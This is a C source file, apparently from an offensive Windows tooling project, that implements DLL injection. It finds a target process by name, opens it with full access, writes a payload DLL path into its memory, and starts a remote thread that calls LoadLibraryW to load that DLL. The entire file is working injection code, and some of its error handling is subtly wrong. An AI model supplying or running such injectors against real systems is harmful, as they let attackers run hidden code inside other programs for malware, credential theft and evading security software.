#include "DllInjector.h"

BOOL GetProcessHandleAndPid
(
	_In_ LPCWSTR TargetProcess,
	_Out_ HANDLE* ProcessHandle,
	_Out_ DWORD* ProcessId
)
{

	HANDLE			SnapHandle	= NULL;
	PROCESSENTRY32W pe32		= { 0 };
	pe32.dwSize					= sizeof(pe32);

	if (!(SnapHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) || SnapHandle == INVALID_HANDLE_VALUE)
	{
		WARN("Failed To Get a Snap Handle!");
		PRINT_ERROR("CreateToolhelp32Snapshot");
		return FALSE; // no point of continuing
	}

	if (!Process32FirstW(SnapHandle, &pe32))
	{
		WARN("Failed To Load First Process!");
		PRINT_ERROR("Process32FirstW");
		return FALSE;
	}

	do
	{

		if (_wcsicmp(pe32.szExeFile, TargetProcess) == 0)
		{

			*ProcessId = pe32.th32ProcessID;

			if (!(*ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID)) || *ProcessHandle == NULL)
			{
				WARN("Failed To Get Process Handle!");
				PRINT_ERROR("OpenProcess");
				return FALSE;
			}

		}

	} while (Process32NextW(SnapHandle, &pe32));


	if (SnapHandle)
		CloseHandle(SnapHandle);

	return TRUE;

}

BOOL DllInjection
(
	_In_ HANDLE ProcessHandle,
	_In_ LPCWSTR Payload,
	_In_ SIZE_T PayloadSize,
	_In_ DWORD ProcessId
)
{

	BOOL	State			= TRUE;

	PVOID	PayloadBuffer	= NULL;
	PVOID	FunctionAddress = NULL;
	PVOID   ThreadHandle	= NULL;

	SIZE_T  BytesWritten	= 0;
	DWORD	ThreadId		= 0;

	if ((FunctionAddress = GetProcAddress(GetModuleHandleW(L"Kernel32.dll"), "LoadLibraryW")) == NULL)
	{
		PRINT_ERROR("GetProcAddress");
		return FALSE;
	}

	if ((PayloadBuffer = VirtualAllocEx(ProcessHandle, NULL, PayloadSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE)) == NULL)
	{
		WARN("Failed To Allocate %zu Bytes to PayloadBuffer!", PayloadSize);
		PRINT_ERROR("VirtualAllocEx");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Successfully allocated %zu Bytes to PayloadBuffer!", PayloadSize);

	if (!WriteProcessMemory(ProcessHandle, PayloadBuffer, (LPCVOID)Payload, PayloadSize, &BytesWritten))
	{
		WARN("Failed To Write Our Payload To Target Process");
		PRINT_ERROR("WriteProcessMemory");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Successfully Wrote %zu Bytes to Target Process!", PayloadSize);
	INFO("Base Address --> [0x%p] Buffer Address --> {0x%p]", PayloadBuffer, (PVOID)&Payload);

	if ((ThreadHandle = CreateRemoteThread(ProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)FunctionAddress, PayloadBuffer, 0, &ThreadId)) == INVALID_HANDLE_VALUE)
	{
		WARN("Failed To Create a new Thread Pointing to Our Payload!");
		PRINT_ERROR("CreateRemoteThreadEx");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Newly Created Thread! Pointing to Payload Buffer --> [0x%p]", PayloadBuffer);
	INFO("Waiting For Thread To Finish Executing...");

	WaitForSingleObject(ThreadHandle, INFINITE);

	OKAY("DONE!");

_END_FUNC:

	if (ThreadHandle)
		CloseHandle(ThreadHandle);

	if (ProcessHandle)
		CloseHandle(ProcessHandle);

	if (PayloadBuffer)
		VirtualFree(PayloadBuffer, 0, MEM_RELEASE);

	return State;

}